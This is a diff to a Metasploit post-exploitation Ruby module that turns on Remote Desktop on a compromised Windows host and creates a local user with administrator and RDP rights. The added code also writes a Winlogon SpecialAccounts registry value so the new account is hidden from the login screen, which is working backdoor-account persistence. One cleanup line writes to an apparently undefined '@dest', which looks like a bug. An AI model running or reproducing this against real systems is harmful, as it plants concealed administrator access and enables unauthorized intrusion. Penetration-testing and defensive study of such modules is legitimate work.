@@ -5,8 +5,8 @@
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -15,12 +15,14 @@ require 'msf/core/post/file'
 require 'msf/core/post/windows/accounts'
 require 'msf/core/post/windows/registry'
 require 'msf/core/post/windows/services'
+require 'msf/core/post/windows/priv'
 
 class Metasploit3 < Msf::Post
 
 	include Msf::Post::Windows::Accounts
 	include Msf::Post::Windows::Registry
 	include Msf::Post::Windows::WindowsServices
+	include Msf::Post::Windows::Priv
 	include Msf::Post::Common
 	include Msf::Post::File
 
@@ -49,17 +51,24 @@ class Metasploit3 < Msf::Post
 	end
 
 	def run
-		
 		if datastore['ENABLE'] or (datastore['USERNAME'] and datastore['PASSWORD'])
 			cleanup_rc = store_loot("host.windows.cleanup.enable_rdp", "text/plain", session,"" ,
-						"enable_rdp_cleanup.rc", "enable_rdp cleanup resource file")
+				"enable_rdp_cleanup.rc", "enable_rdp cleanup resource file")
 
 			if datastore['ENABLE']
-				enablerd(cleanup_rc)
-				enabletssrv(cleanup_rc)
+				if is_admin?
+					enablerd(cleanup_rc)
+					enabletssrv(cleanup_rc)
+				else
+					print_error("Insufficient privileges, Remote Desktop Service was not modified")
+				end
 			end
 			if datastore['USERNAME'] and datastore['PASSWORD']
-				addrdpusr(datastore['USERNAME'], datastore['PASSWORD'],cleanup_rc)
+				if is_admin?
+					addrdpusr(datastore['USERNAME'], datastore['PASSWORD'],cleanup_rc)
+				else
+					print_error("Insufficient privileges, account was not be created.")
+				end
 			end
 			if datastore['FORDWARD']
 				print_status("Starting the port forwarding at local port #{datastore['LPORT']}")
@@ -115,25 +124,34 @@ class Metasploit3 < Msf::Post
 
 
 	def addrdpusr(username, password,cleanup_rc)
-
 		rdu = resolve_sid("S-1-5-32-555")[:name]
 		admin = resolve_sid("S-1-5-32-544")[:name]
 
 		print_status "Setting user account for logon"
 		print_status "\tAdding User: #{username} with Password: #{password}"
 		begin
-			cmd_exec("net user #{username} #{password} /add")
-			file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
-			print_status "\tAdding User: #{username} to local group '#{rdu}'"
-			cmd_exec("net localgroup \"#{rdu}\" #{username} /add")
+			addusr_out = cmd_exec("cmd.exe", "/c net user #{username} #{password} /add")
+			if addusr_out =~ /success/i
+				file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
+				print_status "\tAdding User: #{username} to local group '#{rdu}'"
+				cmd_exec("cmd.exe","/c net localgroup \"#{rdu}\" #{username} /add")
 
-			print_status "\tAdding User: #{username} to local group '#{admin}'"
-			cmd_exec("net localgroup #{admin}  #{username} /add")
-			print_status "You can now login with the created user"
+				print_status "\tHiding user from Windows Login screen"
+				hide_user_key = 'HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList'
+				registry_setvaldata(hide_user_key,username,0,"REG_DWORD")
+				file_local_write(@dest,"reg deleteval -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\ NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList -v #{username}")
+				print_status "\tAdding User: #{username} to local group '#{admin}'"
+				cmd_exec("cmd.exe","/c net localgroup #{admin}  #{username} /add")
+				print_status "You can now login with the created user"
+			else
+				print_error("Account could not be created")
+				print_error("Error:")
+				addusr_out.each_line do |l|
+					print_error("\t#{l.chomp}")
+				end
+			end
 		rescue::Exception => e
 			print_status("The following Error was encountered: #{e.class} #{e}")
 		end
 	end
-
-
 end
